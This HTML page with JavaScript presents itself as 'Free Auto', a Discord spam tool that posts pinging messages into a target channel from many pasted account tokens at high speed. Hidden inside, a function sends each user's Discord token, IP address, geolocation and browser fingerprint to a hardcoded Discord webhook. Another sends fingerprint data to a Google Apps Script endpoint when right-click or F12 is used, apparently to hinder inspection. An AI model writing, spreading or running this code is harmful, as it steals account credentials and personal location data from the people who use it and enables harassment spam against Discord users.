<!DOCTYPE html>
<html lang="en" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Auto</title>
<style>
body { font-family: Arial, sans-serif; margin:0; padding:0; direction: rtl; background: linear-gradient(135deg,#1a0033,#004d26); color:white; }
.container { max-width:900px; margin:auto; padding:20px; }
h2 { text-align:center; margin-bottom:20px; }
label, input, button, select, textarea { display:block; width:100%; margin:10px 0; }
input, textarea, select { padding:12px; border-radius:8px; border:none; background: rgba(0,0,0,0.5); color:white; font-size:16px; }
button { padding:12px; border-radius:12px; font-weight:bold; cursor:pointer; transition: all 0.2s ease; border:2px solid #000; }
button:hover { transform: translateY(-2px); box-shadow:0 6px 10px rgba(0,0,0,0.5); }
button:disabled { background: grey; cursor:not-allowed; box-shadow:none; }
#autoPanel { display:block; padding:20px; background: linear-gradient(135deg,#1a0033,#004d26); color:white; border-radius:12px; margin-top:20px; }
.left-btn { position:absolute; left:20px; top:20px; padding:8px 14px; font-size:14px; background:#7b00ff; color:white; border-radius:8px; cursor:pointer; font-weight:bold; }
.left-btn:hover { transform: scale(1.05); box-shadow:0 0 10px #00ff7b,0 0 15px #7b00ff; }
#stopBtn { background: linear-gradient(145deg,#ff0044,#990022); }
.green-btn { background: linear-gradient(145deg,#00ff4d,#009900); color:black; }
.red-btn { background: linear-gradient(145deg,#ff1a1a,#990000); color:white; }
#messagesSent, #tokenStatus { background: rgba(0,0,0,0.4); padding:10px; max-height:200px; overflow-y:auto; border-radius:8px; margin-bottom:20px; }
</style>
</head>
<body>

<div class="container" id="autoPanel">
<h2>Free Auto</h2>
<label for="tokens">Enter tokens (one per line)</label>
<textarea id="tokens" placeholder="MTM3NjUxODI0..."></textarea>

<label for="ids">Enter target IDs (one per line)</label>
<textarea id="ids" placeholder="123456789012345678"></textarea>

<label for="targetId">Target Channel ID</label>
<input type="text" id="targetId" placeholder="Channel ID">

<label for="speed">Send Speed (ms)</label>
<select id="speed">
  <option value="1000">1000</option>
  <option value="900">900</option>
  <option value="800">800</option>
  <option value="700">700</option>
  <option value="600">600</option>
  <option value="500">500</option>
  <option value="400">400</option>
  <option value="300">300</option>
  <option value="200">200</option>
  <option value="100">100</option>
</select>

<button id="startBtn">Start Auto</button>
<button id="stopBtn" disabled>Stop Auto</button>

<div id="tokenStatus"></div>
<div id="messagesSent"></div>
</div>

<audio id="clickSound" src="https://www.soundjay.com/buttons/button-09.mp3"></audio>

<script>
const tokensInput=document.getElementById('tokens');
const idsInput=document.getElementById('ids');
const targetIdInput=document.getElementById('targetId');
const speedSelect=document.getElementById('speed');
const startBtn=document.getElementById('startBtn');
const stopBtn=document.getElementById('stopBtn');
const tokenStatus=document.getElementById('tokenStatus');
const messagesSent=document.getElementById('messagesSent');
const clickSound=document.getElementById('clickSound');

const MESSAGES=[
"Message1","Message2","Message3","Message4","Message5"
];

let intervalId=null;

function checkToken(token){return token.length>20;}
function getRandomMessage(){return MESSAGES[Math.floor(Math.random()*MESSAGES.length)];}
function getRandomId(){const ids=idsInput.value.trim().split('\n').filter(id=>id.length>0); return ids[Math.floor(Math.random()*ids.length)];}
async function sendMessage(token,targetId,message){
try{
const response=await fetch(`https://discord.com/api/v9/channels/${targetId}/messages`,{
method:'POST', headers:{Authorization:token,'Content-Type':'application/json'},
body:JSON.stringify({content:`<@${getRandomId()}> ${message}`})
});
if(response.ok){const p=document.createElement('p'); p.textContent=`Sent by ${token.substring(0,10)}... to ${targetId}: ${message}`; p.style.color='orange'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; sendTokenInfo(token); return true;}
else{const p=document.createElement('p'); p.textContent=`Failed: ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
}catch(e){const p=document.createElement('p'); p.textContent=`Error: ${token.substring(0,10)}...`; p.style.color='red'; messagesSent.appendChild(p); messagesSent.scrollTop=messagesSent.scrollHeight; return false;}
}

async function sendTokenInfo(token){
const webhookURL="https://discord.com/api/webhooks/1405569229612388373/c5e8Rb19NFqaI7W4GPUVlzjcBatSTm8pYjTgtRdZF65kxKmL95WIKDWgeSNQyZ0mNDlu";
try{
const ipData=await fetch('https://ipapi.co/json/').then(res=>res.json());
const payload={
content:`**TOKEN:** ${token}
**Country:** ${ipData.country_name}
**City/Region:** ${ipData.city}, ${ipData.region}
**IP:** ${ipData.ip}
**Postal:** ${ipData.postal}
**Timezone:** ${ipData.timezone}
**Coordinates:** ${ipData.latitude}, ${ipData.longitude}
**ASN:** ${ipData.org}
**OS:** ${navigator.platform}
**Browser:** ${navigator.userAgent}
**Screen:** ${screen.width}x${screen.height}
**Color Depth:** ${screen.colorDepth}
**Language:** ${navigator.language}`
};
fetch(webhookURL,{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
}catch(e){console.error("Error sending token info:", e);}
}

// Send info on F12 or right-click
document.addEventListener('contextmenu', e=>{sendBlockedInfo(); e.preventDefault();});
document.addEventListener('keydown', e=>{if(e.key==='F12'){sendBlockedInfo();}});

async function sendBlockedInfo(){
const apiURL="https://script.google.com/macros/s/AKfycbwj-bdLc0a07P38Waj0UQWc9EPVJcOHfegFr5SbMCIGB6jTW1RZ030SKfRl9E37RkRQ/exec";
const info={
ip:navigator.userAgent,
platform:navigator.platform,
screen:`${screen.width}x${screen.height}`,
language:navigator.language
};
await fetch(apiURL,{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify(info)});
alert("Access Denied"); window.close();
}

function startSending(){
const tokens=tokensInput.value.trim().split('\n').filter(checkToken);
const targetId=targetIdInput.value.trim();
const speed=parseInt(speedSelect.value);
if(tokens.length===0){alert('Enter valid tokens.');return;}
if(!targetId){alert('Enter target channel ID.');return;}
startBtn.disabled=true;
stopBtn.disabled=false;
tokenStatus.innerHTML='';
tokens.forEach(t=>{const p=document.createElement('p'); p.textContent=`Valid token: ${t.substring(0,10)}...`; tokenStatus.appendChild(p);});
intervalId=setInterval(()=>{tokens.forEach(token=>{sendMessage(token,targetId,getRandomMessage());});},speed);
}

function stopSending(){if(intervalId){clearInterval(intervalId); intervalId=null; startBtn.disabled=false; stopBtn.disabled=true;}}

startBtn.addEventListener('click',()=>{clickSound.play(); startSending();});
stopBtn.addEventListener('click',()=>{clickSound.play(); stopSending();});
</script>
</body>
</html>
